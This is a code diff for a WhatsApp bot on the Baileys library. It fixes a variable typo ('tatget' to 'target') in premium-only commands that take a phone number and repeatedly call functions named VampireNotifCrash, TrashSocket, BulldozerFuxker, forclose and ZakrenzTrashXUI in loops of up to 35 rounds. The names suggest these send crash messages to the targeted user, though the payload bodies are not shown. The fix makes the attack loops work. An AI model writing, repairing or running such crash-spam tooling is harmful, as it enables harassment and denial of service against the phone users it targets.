@@ -18,6 +18,7 @@ downloadContentFromMessage
 } = require("@whiskeysockets/baileys");
 const fs = require('fs-extra')
 const util = require('util')
+const axios = require('axios');
 const chalk = require('chalk')
 const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
 const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
@@ -1626,7 +1627,7 @@ target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
             await VampireNotifCrash(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
-            await ZakrenzTrashXUI(tatget);
+            await ZakrenzTrashXUI(target);
             await sleep(1500);
             await trashprotocol(target);
             await bulldozer(target);
@@ -1643,7 +1644,7 @@ target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
             await VampireNotifCrash(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
-            await ZakrenzTrashXUI(tatget);
+            await ZakrenzTrashXUI(target);
             await sleep(2500);
             }
           }
@@ -1655,14 +1656,14 @@ if (!isPremium) return m.reply('Khusus Premium');
 if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           for (let i = 0; i < 35; i++) {
-            await ZakrenzTrashXUI(tatget);
+            await ZakrenzTrashXUI(target);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
             await sleep(2000);
-            await ZakrenzTrashXUI(tatget);
+            await ZakrenzTrashXUI(target);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
